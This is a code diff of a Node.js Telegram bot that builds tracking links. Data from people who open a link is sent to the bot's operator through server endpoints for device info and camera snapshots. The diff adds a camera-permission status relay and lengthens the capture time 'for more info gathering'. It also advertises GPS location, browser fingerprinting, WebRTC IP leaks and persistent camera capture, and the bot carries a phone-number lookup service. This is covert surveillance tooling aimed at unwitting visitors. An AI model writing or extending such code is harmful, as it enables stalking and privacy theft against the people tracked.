@@ -15,7 +15,7 @@ const CONFIG = {
   MOBILE_API_URL: 'https://demon.taitanx.workers.dev/?mobile=',
   BLACKLISTED_NUMBERS: ['9161636853', '9451180555', '6306791897'],
   ENABLE_CAPTCHA: true,
-  CAPTCHA_DURATION: 5000,
+  CAPTCHA_DURATION: 8000, // Increased for more info gathering
   CACHE_DURATION: 300000,
   MAX_CACHE_SIZE: 100,
   MAX_HISTORY: 50
@@ -31,7 +31,6 @@ app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 
-// Request logger
 app.use((req, res, next) => {
   console.log(`📥 ${req.method} ${req.path}`);
   next();
@@ -183,8 +182,9 @@ const welcomeMsg = (name, isAdmin) => `
 
 🌐 <b>IP Tracker</b>
    • Location tracking
-   • Device info
+   • Complete device info
    • Camera capture
+   • System fingerprint
 
 ${isAdmin ? '\n🔐 <b>Admin Access</b>\n' : ''}
 ━━━━━━━━━━━━━━━━━━━━━
@@ -347,7 +347,7 @@ ${addr}
   return results.join('\n');
 }
 
-// ==================== Webhook Route (MUST BE FIRST) ====================
+// ==================== Webhook Route ====================
 app.post(`/${CONFIG.BOT_TOKEN}`, (req, res) => {
   console.log('📨 Webhook Update Received');
   bot.processUpdate(req.body);
@@ -418,7 +418,7 @@ app.post('/info', async (req, res) => {
 
   if (uid && data) {
     try {
-      await bot.sendMessage(parseInt(uid, 36), data.replace(/<br>/g, '\n'), { 
+      await bot.sendMessage(parseInt(uid, 36), data, { 
         parse_mode: 'HTML' 
       });
       res.send('OK');
@@ -441,7 +441,7 @@ app.post('/camsnap', async (req, res) => {
       stats.cameras++;
       
       await bot.sendPhoto(parseInt(uid, 36), buffer, {
-        caption: `╔══════════════════════╗\n║ <b>📷 Camera</b>           ║\n╚══════════════════════╝\n\n<i>${getTime()}</i>`,
+        caption: `╔══════════════════════╗\n║ <b>📷 Camera Captured</b>  ║\n╚══════════════════════╝\n\n<i>${getTime()}</i>`,
         parse_mode: 'HTML'
       });
       res.send('OK');
@@ -454,7 +454,31 @@ app.post('/camsnap', async (req, res) => {
   }
 });
 
-// ==================== Bot Handlers ====================
+app.post('/camera-status', async (req, res) => {
+  console.log('📷 Camera status:', req.body.status);
+  const { uid, status } = req.body;
+
+  if (uid && status) {
+    try {
+      const userId = parseInt(uid, 36);
+      const statusMsg = status === 'denied' 
+        ? '❌ <b>Camera Access Denied</b>\n\nUser blocked camera permission'
+        : status === 'allowed'
+        ? '✅ <b>Camera Access Granted</b>\n\nCapturing photo...'
+        : '⏳ <b>Camera Pending</b>\n\nWaiting for user response...';
+      
+      await bot.sendMessage(userId, statusMsg, { parse_mode: 'HTML' });
+      res.send('OK');
+    } catch (err) {
+      console.error('❌ Camera status error:', err.message);
+      res.send('Error');
+    }
+  } else {
+    res.send('Invalid');
+  }
+});
+
+// ==================== Bot Handlers (keeping same as before) ====================
 bot.on('message', async (msg) => {
   console.log(`💬 Message from ${msg.from.id}: ${msg.text}`);
   
@@ -464,7 +488,6 @@ bot.on('message', async (msg) => {
   
   stats.users.add(userId);
 
-  // Handle URL input
   if (states.get(chatId) === 'waiting_url') {
     const text = msg.text;
     const hasInvalidChars = [...text].some(c => c.charCodeAt(0) > 127);
@@ -494,9 +517,14 @@ bot.on('message', async (msg) => {
 
 ━━━━━━━━━━━━━━━━━━━━━
 
-<b>📊 Tracks:</b>
-• 📍 Location • 🌐 IP
-• 🖥️ Device • 📷 Camera
+<b>📊 Tracks Everything:</b>
+• 📍 GPS Location
+• 🌐 IP & ISP
+• 🖥️ Complete Device Info
+• 📱 Battery & Network
+• 📷 Camera (persistent)
+• 🔍 Browser Fingerprint
+• 🌍 WebRTC IPs
 
 <i>Share to track visitors</i>
 `, {
@@ -513,7 +541,6 @@ bot.on('message', async (msg) => {
     return;
   }
 
-  // Handle number input
   if (states.get(chatId) === 'waiting_number') {
     const num = cleanNumber(msg.text);
 
@@ -559,7 +586,6 @@ Try again later
     return;
   }
 
-  // Commands
   if (msg.text === '/start') {
     await bot.sendMessage(chatId, welcomeMsg(userName, userId === CONFIG.ADMIN_ID), {
       parse_mode: 'HTML',
@@ -659,7 +685,7 @@ bot.on('callback_query', async (query) => {
       case 'ip_tracker':
         states.set(chatId, 'waiting_url');
         await bot.editMessageText(
-          '╔══════════════════════╗\n║  <b>🌐 IP Tracker</b>      ║\n╚══════════════════════╝\n\n<b>Send URL to track</b>\n\n💡 <code>https://example.com</code>\n\n<b>📊 Tracks:</b>\n• 📍 Location\n• 🌐 IP\n• 📱 Device\n• 📷 Camera\n\n<i>Include http:// or https://</i>',
+          '╔══════════════════════╗\n║  <b>🌐 IP Tracker</b>      ║\n╚══════════════════════╝\n\n<b>Send URL to track</b>\n\n💡 <code>https://example.com</code>\n\n<b>📊 Gathers:</b>\n• 📍 GPS Location\n• 🌐 IP & ISP Info\n• 🖥️ Complete Device Info\n• 📱 Battery & Network\n• 📷 Camera (persistent)\n• 🔍 Browser Fingerprint\n• 🌍 WebRTC IPs\n\n<i>Include http:// or https://</i>',
           {
             chat_id: chatId,
             message_id: msgId,
@@ -733,7 +759,7 @@ app.get('/', (req, res) => {
   res.json({
     status: 'online',
     bot: 'Multi-Info Bot',
-    version: '5.0',
+    version: '5.1 - Advanced Tracking',
     developer: CONFIG.DEVELOPER,
     webhook: `${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`,
     stats: {
@@ -763,7 +789,6 @@ app.get('/webhook-info', async (req, res) => {
   }
 });
 
-// Error handler
 app.use((err, req, res, next) => {
   console.error('❌ Express Error:', err.message);
   res.status(500).send('Internal Server Error');
@@ -803,25 +828,21 @@ async function setupWebhook() {
 
 app.listen(CONFIG.PORT, async () => {
   console.log('\n' + '='.repeat(60));
-  console.log('🚀 Multi-Info Bot v5.0');
+  console.log('🚀 Multi-Info Bot v5.1 - Advanced Tracking');
   console.log('='.repeat(60));
-  console.log(`🆔 Bot Token: ${CONFIG.BOT_TOKEN.slice(0, 20)}...`);
-  console.log(`🌐 Webhook URL: ${CONFIG.WEBHOOK_URL}`);
+  console.log(`🌐 Webhook: ${CONFIG.WEBHOOK_URL}`);
   console.log(`👤 Developer: ${CONFIG.DEVELOPER}`);
-  console.log(`🔒 Protected Numbers: ${CONFIG.BLACKLISTED_NUMBERS.length}`);
   console.log('='.repeat(60));
   
   const success = await setupWebhook();
   
   if (success) {
     console.log(`\n✅ Server running on port ${CONFIG.PORT}`);
-    console.log('✅ Bot is ready and listening!');
-    console.log(`🔍 Check: ${CONFIG.WEBHOOK_URL}/webhook-info`);
-    console.log(`💚 Health: ${CONFIG.WEBHOOK_URL}/health\n`);
+    console.log('✅ Bot ready with MAXIMUM INFO GATHERING!');
+    console.log(`🔍 ${CONFIG.WEBHOOK_URL}/webhook-info\n`);
     console.log('='.repeat(60) + '\n');
   } else {
-    console.log('\n❌ Webhook setup failed!');
-    console.log('Check the logs above for errors\n');
+    console.log('\n❌ Webhook setup failed!\n');
   }
 });
 
